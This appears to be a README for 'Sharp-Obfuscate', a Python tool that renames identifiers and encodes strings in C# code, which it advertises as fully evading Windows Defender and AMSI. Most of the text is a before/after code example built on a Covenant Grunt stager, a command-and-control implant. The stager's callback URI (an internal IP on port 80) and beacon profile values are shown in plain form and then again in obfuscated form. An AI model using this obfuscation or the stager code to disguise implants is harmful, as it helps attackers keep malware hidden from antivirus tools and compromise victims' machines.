# Sharp-Obfuscate 
## *Depricated for Net-Obfuscate*
Obfuscate C# Function, Parameter, Variable Names and Encode Strings\
Fully Evades Windows Defender and AMSI Signatures
```
usage: CodeObfuscator.py [-h] SolutionFile

Obfuscate C# Function,Parameter, Variable Names and Encode Strings.

positional arguments:
  SolutionFile

optional arguments:
  -h, --help  show this help message and exit
```

### Covenant Stager Example:
*Before:*
```
namespace GruntStager
{
    public class GruntStager
    {
        public GruntStager()
        {
            ExecuteStager();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new GruntStager();
        }
        public static void Execute()
        {
            new GruntStager();
        }
        public void ExecuteStager()
        {
            try
            {
                List<string> CovenantURIs = @"http://192.168.72.166:80".Split(',').ToList();
                string CovenantCertHash = @"";
		List<string> ProfileHttpHeaderNames = @"VXNlci1BZ2VudA==,Q29va2llcw==".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
		List<string> ProfileHttpHeaderValues = @"TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
		List<string> ProfileHttpUrls = @"L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
...
```
*After:*
```
using static Obfu.Obfu;

namespace BzHjbrRglIO
{
    public class BzHjbrRglIO
    {
        public BzHjbrRglIO()
        {
            RpApRShvhmM();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new BzHjbrRglIO();
        }
        public static void VetbUTOZbEt()
        {
            new BzHjbrRglIO();
        }
        public void RpApRShvhmM()
        {
            try
            {
                List<string> TbrKzNbzQRn = KmSsNvBucBz("68-74-74-70-3a-2f-2f-31-39-32-2e-31-36-38-2e-37-32-2e-31-36-36-3a-38-30").Split(',').ToList();
                string IHLFCvkayes = @"";
		List<string> MmtzcyzJbSR = KmSsNvBucBz("56-58-4e-6c-63-69-31-42-5a-32-56-75-64-41-3d-3d-2c-51-32-39-76-61-32-6c-6c-63-77-3d-3d").Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
		List<string> DjKLfhgILmJ = KmSsNvBucBz("54-57-39-36-61-57-78-73-59-53-38-31-4c-6a-41-67-4b-46-64-70-62-6d-52-76-64-33-4d-67-54-6c-51-67-4e-69-34-78-4b-53-42-42-63-48-42-73-5a-56-64-6c-59-6b-74-70-64-43-38-31-4d-7a-63-75-4d-7a-59-67-4b-45-74-49-56-45-31-4d-4c-43-42-73-61-57-74-6c-49-45-64-6c-59-32-74-76-4b-53-42-44-61-48-4a-76-62-57-55-76-4e-44-45-75-4d-43-34-79-4d-6a-49-34-4c-6a-41-67-55-32-46-6d-59-58-4a-70-4c-7a-55-7a-4e-79-34-7a-4e-67-3d-3d-2c-51-56-4e-51-55-30-56-54-55-30-6c-50-54-6b-6c-45-50-58-74-48-56-55-6c-45-66-54-73-67-55-30-56-54-55-30-6c-50-54-6b-6c-45-50-54-45-31-4e-54-49-7a-4d-7a-49-35-4e-7a-45-33-4e-54-41-3d").Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
		List<string> QMSUNyrLkXD = KmSsNvBucBz("4c-32-56-75-4c-58-56-7a-4c-32-6c-75-5a-47-56-34-4c-6d-68-30-62-57-77-3d-2c-4c-32-56-75-4c-58-56-7a-4c-32-52-76-59-33-4d-75-61-48-52-74-62-41-3d-3d-2c-4c-32-56-75-4c-58-56-7a-4c-33-52-6c-63-33-51-75-61-48-52-74-62-41-3d-3d").Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
...
```
